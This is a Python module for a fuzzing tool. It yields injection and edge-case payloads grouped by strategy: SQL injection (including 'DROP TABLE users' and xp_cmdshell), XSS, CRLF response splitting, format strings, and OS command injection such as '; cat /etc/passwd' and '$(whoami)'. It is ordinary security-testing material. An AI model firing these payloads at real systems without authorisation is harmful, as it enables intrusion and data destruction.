from __future__ import annotations

import itertools
from pathlib import Path
from typing import Generator

Payload = tuple[str, str]  # (strategy_name, payload_string)


# ---------------------------------------------------------------------------
# Individual strategies
# ---------------------------------------------------------------------------

def overflow() -> Generator[Payload, None, None]:
    """Incrementally longer strings to trigger buffer overflows."""
    for char in ("A", "X", "\xff"):
        for length in (100, 500, 1_000, 5_000, 10_000, 50_000, 100_000):
            yield ("overflow", char * length)


def sql_injection() -> Generator[Payload, None, None]:
    """Classic SQL injection probes."""
    payloads = [
        "'", "''", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--",
        "'; DROP TABLE users;--", "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--", "1' ORDER BY 1--",
        "1' ORDER BY 100--", "') OR ('1'='1",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' WAITFOR DELAY '0:0:5'--",
        "1; EXEC xp_cmdshell('whoami')--",
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "admin'--", "1' AND '1'='1", "1' AND '1'='2",
    ]
    for p in payloads:
        yield ("sql_injection", p)


def xss() -> Generator[Payload, None, None]:
    """Cross-site scripting payloads."""
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<iframe src='javascript:alert(1)'>",
        "<details open ontoggle=alert(1)>",
        "<math><mtext><table><mglyph><svg><mtext>"
        "<textarea><path id=x xmlns=http://www.w3.org/2000/svg>"
        "<set attributeName=d to='M0 0'/></path></textarea></mtext></svg>"
        "</mglyph></table></mtext></math>",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "<img/src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "{{7*7}}", "${7*7}", "#{7*7}",  # template injection probes
    ]
    for p in payloads:
        yield ("xss", p)


def crlf_injection() -> Generator[Payload, None, None]:
    """CRLF / header injection payloads."""
    injected_header = "X-Injected: true"
    separators = [
        "\r\n", "\r", "\n",
        "%0d%0a", "%0d", "%0a",
        "%0D%0A", "%0D", "%0A",
        "\\r\\n", "\\n",
        "\r\n\r\n",       # double CRLF → body injection
        "%0d%0a%0d%0a",
    ]
    for sep in separators:
        yield ("crlf_injection", f"{sep}{injected_header}")
        yield ("crlf_injection", f"value{sep}{injected_header}")
    # Response splitting
    yield ("crlf_injection", "value\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n")


def format_string() -> Generator[Payload, None, None]:
    """Format-string attack payloads."""
    patterns = [
        "%s", "%x", "%n", "%d", "%p",
        "%s%s%s%s%s%s%s%s%s%s",
        "%x%x%x%x%x%x%x%x%x%x",
        "%n%n%n%n%n%n%n%n%n%n",
        "%p%p%p%p%p%p%p%p%p%p",
        "AAAA%08x.%08x.%08x.%08x",
        "%d%d%d%d%d%d%d%d%d%d",
        "{0}", "{0}{1}{2}", "{{0}}",
        f"{'%x' * 500}",
    ]
    for p in patterns:
        yield ("format_string", p)


def null_byte() -> Generator[Payload, None, None]:
    """Null-byte injection payloads."""
    payloads = [
        "\x00", "test\x00value", "\x00test",
        "%00", "test%00value", "%00test",
        "test\x00", "\x00\x00\x00",
        "test%00.html", "test\x00.html",
    ]
    for p in payloads:
        yield ("null_byte", p)


def unicode_payloads() -> Generator[Payload, None, None]:
    """Unicode edge-case payloads."""
    payloads = [
        "\ufeff",                       # BOM
        "\u202e" + "abc",               # RTL override
        "\u0000",                       # null
        "\ud800",                       # lone high surrogate
        "\U0001f4a9",                   # emoji (pile of poo)
        "Ā" * 1000,                     # repetitive multibyte
        "\xc0\xaf",                     # overlong UTF-8 slash
        "\xe0\x80\xaf",                 # 3-byte overlong
        "\xf0\x80\x80\xaf",            # 4-byte overlong
        "\xef\xbf\xbe",                # non-character
        "\xef\xbf\xbf",                # non-character
        "A\xcc\x81" * 500,             # combining accent repeated
        "\uff21" * 500,                 # fullwidth 'A'
        "\u0001\u0002\u0003\u0004",    # control chars
    ]
    for p in payloads:
        yield ("unicode", p)


def integer() -> Generator[Payload, None, None]:
    """Integer boundary payloads."""
    payloads = [
        "0", "-1", "-0", "1",
        "2147483647",       # INT32_MAX
        "-2147483648",      # INT32_MIN
        "2147483648",       # INT32_MAX + 1
        "4294967295",       # UINT32_MAX
        "4294967296",       # UINT32_MAX + 1
        "9999999999999999999999999999",
        "-9999999999999999999999999999",
        "0x7fffffff",
        "0xffffffff",
        "0e0", "0e1",      # scientific notation
        "NaN", "Infinity", "-Infinity",
        "1.7976931348623157E+10308",  # DBL_MAX approx
        "99999999999999999999999999999999999999999999999999999999",
    ]
    for p in payloads:
        yield ("integer", p)


def command_injection() -> Generator[Payload, None, None]:
    """OS command injection payloads."""
    payloads = [
        "; whoami", "| whoami", "|| whoami", "& whoami", "&& whoami",
        "$(whoami)", "`whoami`",
        "; ls -la", "| ls -la",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "\nwhoami", "\r\nwhoami",
        "; ping -c 3 127.0.0.1",
        "| ping -c 3 127.0.0.1",
        "; sleep 5", "| sleep 5",
        "$(sleep 5)", "`sleep 5`",
        "{${whoami}}", "{{whoami}}",
    ]
    for p in payloads:
        yield ("command_injection", p)


def custom(filepath: str) -> Generator[Payload, None, None]:
    """Load payloads from a user-supplied wordlist (one per line)."""
    path = Path(filepath)
    if not path.is_file():
        return
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            yield ("custom", line)


# ---------------------------------------------------------------------------
# Strategy registry & combinator
# ---------------------------------------------------------------------------

_REGISTRY: dict[str, object] = {
    "overflow": overflow,
    "sql_injection": sql_injection,
    "xss": xss,
    "crlf_injection": crlf_injection,
    "format_string": format_string,
    "null_byte": null_byte,
    "unicode": unicode_payloads,
    "integer": integer,
    "command_injection": command_injection,
}


def generate(
    strategies: list[str],
    custom_file: str | None = None,
) -> Generator[Payload, None, None]:
    """Yield payloads from the selected strategies (+ optional custom file)."""
    chains: list[Generator[Payload, None, None]] = []
    for name in strategies:
        factory = _REGISTRY.get(name)
        if factory is not None:
            chains.append(factory())
    if custom_file:
        chains.append(custom(custom_file))
    yield from itertools.chain.from_iterable(chains)
